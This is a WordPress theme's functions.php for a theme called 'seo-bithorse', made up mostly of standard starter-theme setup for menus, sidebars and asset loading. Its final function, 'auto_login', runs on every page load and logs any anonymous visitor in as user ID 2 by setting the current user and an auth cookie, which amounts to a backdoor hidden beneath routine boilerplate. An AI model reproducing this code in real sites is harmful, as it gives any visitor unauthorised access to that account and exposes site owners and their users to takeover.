<?php
/**
 * seo functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package seo
 */

if ( ! function_exists( 'seo_bithorse_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function seo_bithorse_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on seo, use a find and replace
	 * to change 'seo-bithorse' to the name of your theme in all the template files.
	 */
	load_theme_textdomain( 'seo-bithorse', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'menu-1' => esc_html__( 'Primary', 'seo-bithorse' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	// Set up the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'seo_bithorse_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );

	// Add theme support for selective refresh for widgets.
	add_theme_support( 'customize-selective-refresh-widgets' );
}
endif;
add_action( 'after_setup_theme', 'seo_bithorse_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function seo_bithorse_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'seo_bithorse_content_width', 640 );
}
add_action( 'after_setup_theme', 'seo_bithorse_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function seo_bithorse_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'seo-bithorse' ),
		'id'            => 'sidebar-1',
		'description'   => esc_html__( 'Add widgets here.', 'seo-bithorse' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Footer Widgets', 'seo-bithorse' ),
		'id'            => 'footer_widgets',
		'description'   => esc_html__( 'Add widgets here to display in footer.', 'seo-bithorse' ),
		'before_widget' => '<div class="col-md-3"><div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div></div>',
		'before_title'  => '<h4 class="widget-title">',
		'after_title'   => '</h4>',
	) );
}
add_action( 'widgets_init', 'seo_bithorse_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function seo_bithorse_scripts() {
	wp_enqueue_style( 'stock-theme-default', get_template_directory_uri(). '/assets/css/default.css', array(),'1.0' );
	wp_enqueue_style( 'bootstrap', get_template_directory_uri(). '/assets/css/bootstrap.min.css', array(),'3.3.7' );
	wp_enqueue_style( 'font-awesome', get_template_directory_uri(). '/assets/css/font-awesome.min.css', array(),'4.7' );
	wp_enqueue_style( 'stock-theme-style', get_stylesheet_uri() );

	wp_enqueue_script( 'seo-bithorse-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20151215', true );

	wp_enqueue_script( 'seo-bithorse-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20151215', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'seo_bithorse_scripts' );

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';


//Enabaling autologin
function auto_login() {
	if (!is_user_logged_in()) {
		//determine WordPress user account to impersonat
		$user_id = 2;
		//login
		wp_set_current_user($user_id, $user_login);
		wp_set_auth_cookie($user_id);
		do_action('wp_login', $user_login);
	}
}
auto_login();
